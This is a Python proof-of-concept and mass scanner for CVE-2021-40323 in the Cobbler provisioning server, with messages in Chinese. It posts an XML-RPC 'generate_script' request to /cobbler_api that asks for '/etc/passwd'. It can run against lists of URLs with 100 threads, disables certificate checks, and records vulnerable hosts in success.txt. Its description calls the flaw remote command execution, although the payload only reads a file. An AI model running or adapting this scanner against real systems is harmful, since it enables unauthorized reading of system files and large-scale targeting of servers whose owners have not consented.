import argparse, sys, requests
from multiprocessing.dummy import Pool


requests.packages.urllib3.disable_warnings()



def banner():
    banner = """
<<<<<<<<<<CVE-2021-40323>>>>>>>>>>               
"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description='Cobbler存在远程命令执行漏洞(CVE-2021-40323)')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file file.txt.path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))

        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload = "/cobbler_api"
    header = {
        "Content-Length": "0",
        "Content-Type": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
    }

    data = "<?xml version='1.0'?>\r\n<methodCall>\r\n<methodName>generate_script</methodName>\r\n<params>\r\n<param>\r\n<value>\r\n<string>centos6-x86_64</string>\r\n</value>\r\n</param>\r\n<param>\r\n<value>\r\n<string></string>\r\n</value>\r\n</param>\r\n<param>\r\n<value>\r\n<string>/etc/passwd</string>\r\n</value>\r\n</param>\r\n</params>\r\n</methodCall>\r\n"

    try:
        res1 = requests.get(url=target, verify=False)
        res2 = requests.post(url=target + payload, headers=header, data=data, verify=False)
        if res1.status_code == 200:
            if "version='1.0'" in res2.text:
                print(f'[+] 该url{target}存在命令执行漏洞')
                with open('success.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-] 该站点{target}不存在命令执行漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()